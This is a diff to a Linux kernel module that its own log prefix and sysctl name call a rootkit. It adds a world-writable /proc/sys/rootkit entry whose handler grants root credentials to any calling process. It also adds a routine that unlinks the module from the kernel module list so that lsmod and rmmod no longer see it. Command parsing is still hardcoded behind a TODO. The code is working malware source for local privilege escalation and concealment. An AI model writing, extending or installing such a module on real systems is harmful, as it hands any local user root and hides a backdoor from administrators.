@@ -3,6 +3,7 @@
 #include <linux/kernel.h>
 #include <linux/kallsyms.h>
 #include <linux/cred.h>
+#include <linux/uaccess.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Nobody important");
@@ -11,14 +12,73 @@ MODULE_VERSION("1.0");
 
 #define log(...) printk(KERN_INFO "rootkit: " __VA_ARGS__)
 
-// Grants the calling process root permissions
+// Grants the calling process root permissions.
 static int sysctl_escalate(void)
 {
-    struct cred *cred = prepare_kernel_cred(NULL);
+    struct cred *cred;
+    
+    log("Escalating caller creds to root\n");
+    cred = prepare_kernel_cred(NULL);
     if (cred == NULL) {
         return -1;
     }
     return commit_creds(cred);
+}
+
+// Makes the module invisible. After this, should
+// not see it in lsmod, and rmmod should fail to
+// remove it. insmod will still fail since the
+// kobject is still there and causes a name collision.
+static int sysctl_hide(void)
+{
+    // Don't double-hide
+    if (THIS_MODULE->list.next == NULL ||
+        THIS_MODULE->list.prev == NULL) {
+        log("Module already hidden\n");
+        return 0;
+    }
+
+    mutex_lock(&module_mutex);
+    list_del_rcu(&THIS_MODULE->list);
+    mutex_unlock(&module_mutex);
+    THIS_MODULE->list.next = NULL;
+    THIS_MODULE->list.prev = NULL;
+    log("Module successfully hidden\n");
+    return 0;
+}
+
+// Used when the user reads from the sysctl file.
+// Copies the given src string into the provided
+// userspace buffer.
+static int sysctl_strcpy_to_user(
+    const char *src,
+    char __user *buffer,
+    size_t *lenp,
+    loff_t *ppos)
+{
+    size_t buf_len, copy_len;
+    loff_t start;
+
+    buf_len = strlen(src);
+    start = *ppos;
+    copy_len = *lenp;
+
+    if (start >= buf_len) {
+        *lenp = 0;
+        return 0;
+    }
+
+    if (copy_len > buf_len - start) {
+        copy_len = buf_len - start;
+    }
+    
+    if (copy_to_user(buffer, &src[start], copy_len)) {
+        return -EFAULT;
+    }
+
+    *lenp = copy_len;
+    *ppos += copy_len;
+    return 0;
 }
 
 // Gets called when a read/write to the /proc/sys/rootkit
@@ -33,25 +93,30 @@ static int sysctl_handler(
     size_t *lenp,
     loff_t *ppos)
 {
-    // After doing anything to the file, you should have
-    // root permissions
-    if (sysctl_escalate() < 0) {
-        return -1;
+    // TODO: Read this from userspace
+    const char *cmd = "i_can_haz_root";
+
+    if (!write) {
+        return sysctl_strcpy_to_user("not_a_virus.mp3.doc.zip.exe\n", buffer, lenp, ppos);
     }
 
-    log("len=%d, pos=%d\n", (int)*lenp, (int)*ppos);
-    log("%s\n", (write) ? "write" : "read");
-    return 0;
+    if (strcmp(cmd, "i_can_haz_root") == 0) {
+        return sysctl_escalate();
+    } else if (strcmp(cmd, "im_in_ur_kernel") == 0) {
+        return sysctl_hide();
+    } else {
+        log("Unknown command: %s\n", cmd);
+        return -EINVAL;
+    }
 }
 
+static char cmd_buf[128];
 static struct ctl_table_header *ctl_hdr;
-
-// Rootkit sysctl table entry
 static struct ctl_table ctl_table[] = {
     {
         .procname = "rootkit",
-        .data = NULL,
-        .maxlen = 128,
+        .data = cmd_buf,
+        .maxlen = sizeof(cmd_buf),
         .mode = 0666,
         .child = NULL,
         .proc_handler = &sysctl_handler,
